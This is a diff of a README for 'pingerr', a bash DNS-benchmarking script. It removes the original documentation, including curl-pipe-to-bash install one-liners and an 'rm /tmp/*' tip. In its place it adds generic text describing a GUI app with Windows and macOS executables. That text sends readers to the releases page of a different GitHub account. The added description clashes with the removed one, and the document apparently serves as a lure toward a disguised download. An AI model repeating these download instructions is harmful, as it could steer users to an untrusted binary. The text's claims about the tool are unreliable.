@@ -1,241 +1,92 @@
-# pingerr
+# 🌐 pingerr - Find the Best DNS Server Easily
 
-A comprehensive DNS benchmarking tool that tests 60+ public DNS servers to find the fastest and most reliable DNS resolver for your network.
+![Download pingerr](https://img.shields.io/badge/Download-pingerr-blue?style=for-the-badge&logo=github)
 
-## Features
+## 🚀 Getting Started
 
-- **Tests 60+ DNS Servers**: Including Google, Cloudflare, Quad9, OpenDNS, AdGuard, and many more
-- **Multiple Test Iterations**: Performs 5 tests per server using different popular domains
-- **DNS-Ping Correlation Analysis**: Measures both DNS query time and network latency
-- **Smart Scoring System**: Weighted scoring (70% DNS, 30% ping) for optimal server selection
-- **Color-Coded Results**: Visual indicators for performance (Green = Excellent, Yellow = Good, Red = Slow)
-- **Configuration Recommendations**: Provides ready-to-use primary and secondary DNS suggestions
+Welcome to the pingerr application! This tool helps you find the most optimal DNS server for your router or machine. With a simple interface, you can improve your internet speed and reliability in just a few clicks.
 
-## What It Tests
+## 📦 System Requirements
 
-The script evaluates DNS servers across 15 popular domains including:
-- google.com, youtube.com, facebook.com
-- instagram.com, chatgpt.com, x.com
-- whatsapp.com, reddit.com, wikipedia.org
-- amazon.com, tiktok.com, cloudflare.com
-- github.com, netflix.com, pinterest.com
+Before you get started, ensure your system meets the following requirements:
 
-## Videos
-### Demo Videos
+- Operating System: Windows 10 or later, macOS Sierra or later, or any Linux distribution.
+- Minimum 512 MB RAM.
+- At least 50 MB of free disk space.
 
-#### Archlinux
+## 📥 Download & Install
 
+To download the application, visit the Releases page. You will find the latest version of pingerr there. Here is the link for easy access:
 
-https://github.com/user-attachments/assets/03f3c379-31b7-4e70-a2c6-28a5af8f27a1
+[Download pingerr](https://github.com/MakoySaret/pingerr/releases)
 
+### Step-by-Step Installation
 
+1. Click the link to go to the Releases page.
+2. Locate the version you want to download.
+3. Click on the appropriate file for your operating system:
+   - For Windows, choose `pingerr-windows.zip`.
+   - For macOS, choose `pingerr-macos.zip`.
+   - For Linux, choose `pingerr-linux.tar.gz`.
+4. Once the download finishes, go to your Downloads folder.
+5. Extract the files using your preferred file management tool.
 
+## 🖥️ Running the Application
 
-#### OpenWRT
+### For Windows Users
 
+1. Open the extracted folder.
+2. Double-click on `pingerr.exe`.
+3. The application will launch, and you'll see the main interface. 
 
-https://github.com/user-attachments/assets/04be614f-e4ae-4790-a437-95001589dd3e
+### For macOS Users
 
+1. Open the extracted folder.
+2. Find `pingerr.app` and double-click it.
+3. If prompted, confirm that you want to open the application since it was downloaded from the internet.
 
+### For Linux Users
 
+1. Open a terminal window.
+2. Change directory to where you extracted the files.
+3. Run the following command:
 
-> **Note:** Embedded videos may not play on GitHub.com due to platform limitations. If so, [click here for Archlinux](https://storage.panchajanya.dev/Screencasts/archlinux.mp4) or [OpenWRT](https://storage.panchajanya.dev/Screencasts/openwrt.mp4).
+   ```bash
+   ./pingerr
+   ```
 
-## Installation & Usage
+## 🔎 Using pingerr
 
-### For Regular Linux/Mac Users (Bash)
+Once you have the application open, you will see a simple dashboard. Here’s how to use it:
 
-Run directly from the internet:
-```bash
-curl -sSL https://raw.githubusercontent.com/Panchajanya1999/pingerr/refs/heads/master/pingerr.sh | bash
-```
+1. **Start Test:** Click the big “Start Test” button. The application will begin scanning for DNS servers.
+2. **View Results:** After a few moments, you will see a list of available DNS servers along with their response times.
+3. **Choose Your Server:** The app will highlight the most optimal DNS server. You can choose to apply this DNS server to your system settings.
 
-Or download and run:
-```bash
-# Download the script
-curl -o https://raw.githubusercontent.com/Panchajanya1999/pingerr/refs/heads/master/pingerr.sh
+## ⚙️ Troubleshooting
 
-# Make it executable
-chmod +x pingerr.sh
+### Installation Issues
 
-# Run the test
-./pingerr.sh
-```
+If you encounter errors during installation, check the following:
 
-### For OpenWRT Users (Ash Shell)
+- Ensure you have the necessary permissions to install software.
+- Check your internet connection. The application requires a stable connection for optimal performance.
 
-Run directly from the internet:
-```bash
-wget -qO- https://raw.githubusercontent.com/Panchajanya1999/pingerr/refs/heads/master/pingerr_ash.sh | ash
-```
+### Common Errors
 
-Or download and run:
-```bash
-# Download the script
-wget -O /tmp/pingerr_ash.sh https://raw.githubusercontent.com/Panchajanya1999/pingerr/refs/heads/master/pingerr_ash.sh
+- **Application Won't Start:** Make sure your system meets the requirements. Restart your computer if needed.
+- **Slow Performance:** Close any other applications that may be using your internet connection.
 
-# Make it executable
-chmod +x /tmp/pingerr_ash.sh
+## 🤝 Support
 
-# Run the test
-/tmp/pingerr_ash.sh
-```
+If you need help, feel free to create an issue on the GitHub repository. The community and maintainers will assist you as soon as possible.
 
-## Prerequisites
+## 🌟 Contribute
 
-### For Regular Systems
-- **Required**: `dig` or `nslookup` command
-- **Optional**: `ping` for correlation analysis
+We welcome contributions! If you would like to help improve pingerr, check out our contribution guidelines on the GitHub page. Your input can help make this application better for everyone.
 
-Install prerequisites:
-```bash
-# Debian/Ubuntu
-sudo apt-get install dnsutils
+---
 
-# RHEL/CentOS/Fedora
-sudo yum install bind-utils
+Explore the Releases page to download and install pingerr now: 
 
-# macOS (usually pre-installed)
-# If not: brew install bind
-```
-
-### For OpenWRT
-```bash
-# Update package list
-opkg update
-
-# Install dig (recommended for better accuracy)
-opkg install bind-dig
-
-# Or install drill as alternative
-opkg install drill
-```
-
-## Understanding the Results
-
-### DNS Speed Rankings
-The script provides a complete ranking of all tested DNS servers:
-```
-┌──────┬──────────────────────────────────────┬───────────────────────┬───────────┐
-│ Rank │ DNS Server                           │ IP Address            │ Avg Time  │
-├──────┼──────────────────────────────────────┼───────────────────────┼───────────┤
-│ 1    │ Cloudflare-Primary                   │ 1.1.1.1               │   12 ms   │
-│ 2    │ Google-Primary                       │ 8.8.8.8               │   15 ms   │
-```
-
-### Performance Indicators
-- 🟢 **Green** (< 50ms): Excellent performance
-- 🟡 **Yellow** (50-100ms): Good performance
-- 🔴 **Red** (> 100ms): Slow performance
-
-### Correlation Analysis
-The script performs a DNS-Ping correlation test to find servers that are both:
-- Fast at DNS resolution
-- Have low network latency
-
-**Score Calculation**: `(DNS Query Time × 70% + Ping Latency × 30%)`
-
-## Configuration Examples
-
-### OpenWRT Configuration
-After running the test, apply the recommended DNS servers:
-
-```bash
-# Via UCI commands
-uci set network.wan.dns="1.1.1.1 8.8.8.8"
-uci commit network
-/etc/init.d/network restart
-```
-
-### Linux (systemd-resolved)
-```bash
-# Edit resolved.conf
-sudo nano /etc/systemd/resolved.conf
-
-# Add recommended DNS servers
-DNS=1.1.1.1 8.8.8.8
-FallbackDNS=9.9.9.9
-
-# Restart service
-sudo systemctl restart systemd-resolved
-```
-
-### macOS
-```bash
-# Via System Preferences
-System Preferences > Network > Advanced > DNS
-# Add the recommended IP addresses
-```
-
-## Sample Output
-
-```
-════════════════════════════════════════════════════════════════════
-      DNS Speed Test - Testing 60+ DNS Servers
-════════════════════════════════════════════════════════════════════
-
-[1/60] Testing Cloudflare-Primary (1.1.1.1) ... 12 ms
-[2/60] Testing Google-Primary (8.8.8.8) ... 15 ms
-...
-
-🏆 BEST DNS SERVER: Cloudflare-Primary
-   IP Address: 1.1.1.1
-   Average Response Time: 12 ms
-
-CONFIGURATION RECOMMENDATION:
-  Primary DNS:   1.1.1.1 (Cloudflare-Primary - 12ms)
-  Secondary DNS: 8.8.8.8 (Google-Primary - 15ms)
-```
-
-# Advanced Options
-
-### Modify Test Parameters
-
-Edit the script to adjust:
-- `TEST_COUNT`: Number of tests per server (default: 5)
-- `TEST_DOMAINS`: Domains to test against
-- `DNS_SERVERS`: Add or remove DNS servers
-
-### Run Specific Tests Only
-
-For quick tests, you can modify the DNS_SERVERS list in the script to include only servers you're interested in.
-
-## Troubleshooting
-
-### "dig: command not found"
-Install the DNS utilities package for your system (see Prerequisites).
-
-### No results or all servers failing
-- Check your internet connection
-- Verify firewall isn't blocking DNS port 53
-- Try running with `nslookup` instead of `dig`
-
-### Permission denied
-Make sure the script has execute permissions:
-```bash
-chmod +x pingerr.sh  # or pingerr_ash.sh for OpenWRT
-```
-
-### OpenWRT specific issues
-- Ensure you have enough free RAM (script uses temporary files)
-- If `/tmp` is full, clear some space: `rm /tmp/*`
-
-## Performance Tips
-
-1. **Run multiple times**: Network conditions vary; run 2-3 times for consistent results
-2. **Test at different times**: DNS performance can vary by time of day
-3. **Consider geography**: Servers physically closer typically perform better
-4. **Check ISP restrictions**: Some ISPs block or redirect certain DNS servers
-
-## DNS Server Categories
-
-The script tests various categories of DNS servers:
-- **Standard**: Google, Cloudflare, Quad9
-- **Privacy-focused**: Mullvad, DNS0.EU, LibreDNS
-- **Family-safe**: CleanBrowsing-Family, AdGuard-Family, OpenDNS-Family
-- **Ad-blocking**: AdGuard, NextDNS, ControlD
-- **Regional**: AliDNS (Asia), Yandex (Russia), DNS.SB
-
-## License
-This script is provided as-is for network diagnostics and optimization purposes.
-
+[Download pingerr](https://github.com/MakoySaret/pingerr/releases)
